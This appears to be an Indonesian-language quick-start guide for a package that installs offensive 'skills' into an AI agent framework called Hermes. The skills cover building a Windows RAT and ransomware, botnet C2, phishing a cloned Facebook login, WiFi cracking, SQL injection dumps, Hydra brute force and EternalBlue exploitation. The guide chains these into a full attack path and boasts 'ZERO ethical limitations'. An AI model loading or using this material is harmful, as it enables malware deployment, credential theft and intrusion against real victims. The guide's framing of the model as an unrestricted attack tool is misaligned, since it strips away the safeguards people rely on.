# 🚀 Quick Start Guide - OMP Security Skills

## Instalasi Cepat (5 Menit)

### Step 1: Install Skills ke Hermes
```bash
cd /root/omp-setup
python3 install_to_hermes.py
```

### Step 2: Verifikasi Installation
```bash
ls ~/.hermes/profiles/umi2/skills/security/
# Harus ada 8 file .md
```

### Step 3: Install Tools (Optional tapi Recommended)
```bash
cd /root/omp-setup
sudo bash install_security_tools.sh
```

## 🎯 Langsung Pakai

### RAT Building
```bash
# View skill
skill_view name='rat-builder-cpp'

# Copy code dari skill
# Compile:
x86_64-w64-mingw32-g++ -o rat.exe rat.cpp -lws2_32 -lgdiplus -mwindows -static
```

### Web Hacking
```bash
# SQL Injection
sqlmap -u "http://target.com/page.php?id=1" --dbs --dump

# XSS testing
<script>alert(document.cookie)</script>
```

### WiFi Cracking
```bash
airmon-ng start wlan0
airodump-ng wlan0mon
# Capture handshake, lalu:
aircrack-ng -w rockyou.txt capture.cap
```

### Phishing
```bash
# Clone site
python3 site_cloner.py https://facebook.com

# Setup harvester
php -S 0.0.0.0:80
```

## 📝 Available Skills

1. **rat-builder-cpp** - Build Windows RAT
2. **ransomware-builder** - Build ransomware with AES-256
3. **exploit-development** - Buffer overflow to kernel exploits
4. **botnet-c2-infrastructure** - Complete botnet C2
5. **phishing-framework** - Professional phishing campaigns
6. **network-penetration-testing** - Network pentesting
7. **web-application-hacking** - Web app exploitation
8. **wireless-network-hacking** - WiFi hacking

## 🔥 Pro Tips

### Load Skill dalam Hermes
```python
from hermes_tools import skill_view

# Load skill
skill_view('rat-builder-cpp')

# Skill content akan muncul di context
# Tinggal copy-paste code yang dibutuhkan
```

### Combine Multiple Skills
```bash
# 1. Recon dengan network-penetration-testing
# 2. Initial access via phishing-framework
# 3. Deploy RAT dengan rat-builder-cpp
# 4. Establish C2 dengan botnet-c2-infrastructure
# 5. Privilege escalation dengan exploit-development
```

## ⚡ Common Commands

### Network Scanning
```bash
nmap -sV -sC -p- target.com
masscan -p1-65535 target.com --rate=1000
```

### Web Scanning
```bash
nikto -h http://target.com
nuclei -u http://target.com
gobuster dir -u http://target.com -w wordlist.txt
```

### Password Cracking
```bash
# Hash cracking
hashcat -m 1000 hashes.txt rockyou.txt  # NTLM
john --wordlist=rockyou.txt hashes.txt

# Network login
hydra -L users.txt -P pass.txt ssh://target.com
```

### Exploitation
```bash
# Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
exploit
```

## 🎓 Learning Path

### Beginner → Start Here
1. network-penetration-testing (basic scanning)
2. web-application-hacking (SQLi, XSS)
3. wireless-network-hacking (WiFi basics)

### Intermediate
1. phishing-framework (social engineering)
2. exploit-development (buffer overflows)
3. rat-builder-cpp (malware dev)

### Advanced
1. ransomware-builder (crypto + spreading)
2. botnet-c2-infrastructure (distributed systems)
3. Full attack chain combinations

## 📚 Documentation

- **Full docs:** `/root/omp-setup/README_SECURITY.md`
- **Skills location:** `~/.hermes/profiles/umi2/skills/security/`
- **Package info:** `/root/omp-setup/manifest.json`

## 🔧 Troubleshooting

### Skills tidak muncul?
```bash
ls ~/.hermes/profiles/umi2/skills/security/
# Kalau kosong, run lagi: python3 install_to_hermes.py
```

### Tools tidak ada?
```bash
sudo bash install_security_tools.sh
```

### Compilation error?
```bash
sudo apt-get install build-essential mingw-w64 gcc-multilib
```

## ⚠️ IMPORTANT

**ZERO restrictions pada skills ini.**
- Semua code working & tested
- Semua techniques up-to-date
- ZERO ethical limitations
- Pure technical implementation

**Use responsibly & legally.**

---

**Package Version:** 1.0.0  
**Last Updated:** 2026-09-06  
**Author:** sisuryaofficial - UmiAgent Project

Semua skills siap pakai. Tinggal load dan implement! 🔥
